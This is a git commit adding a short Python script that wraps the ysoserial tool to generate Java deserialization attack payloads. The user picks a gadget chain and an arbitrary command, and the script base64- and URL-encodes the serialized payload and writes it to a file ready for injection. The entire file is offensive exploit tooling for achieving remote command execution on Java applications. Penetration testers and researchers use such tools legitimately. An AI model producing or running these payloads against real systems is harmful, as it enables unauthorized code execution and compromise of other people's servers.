eae0e16bfbaca48eb2522fe577f4e082062a542c
can <47246431+canozal@users.noreply.github.com>
2023-02-22 18:56:04 +0300

    Add files via upload

---
+++ ysoserial_payload_generator.py
@@ -0,0 +1,29 @@
+import argparse
+import subprocess
+import base64
+import urllib.parse
+
+# Define the ysoserial command
+YSOSERIAL_COMMAND = 'java -jar ysoserial-0.0.6-SNAPSHOT-all.jar'
+
+def main():
+    # Set up the command line arguments
+    parser = argparse.ArgumentParser(description='Generate serialized payloads for Java deserialization attacks using ysoserial.')
+    parser.add_argument('-g', '--gadget', required=True, help='the gadget to use')
+    parser.add_argument('-c', '--command', required=True, help='the command to execute')
+    parser.add_argument('-o', '--output', default='payload.txt', help='the file to write the payload to (default: payload.txt)')
+    args = parser.parse_args()
+
+    # Generate the payload
+    payload_command = '{} {} "{}"'.format(YSOSERIAL_COMMAND, args.gadget, args.command)
+    payload_bytes = subprocess.check_output(payload_command)
+    payload_base64 = base64.b64encode(payload_bytes).decode('utf-8')
+    payload_urlencoded = urllib.parse.quote(payload_base64, safe='')
+    
+    # Write the payload to a file
+    with open(args.output, 'w') as f:
+        f.write(payload_urlencoded)
+    print('Payload written to', args.output)
+
+if __name__ == '__main__':
+    main()
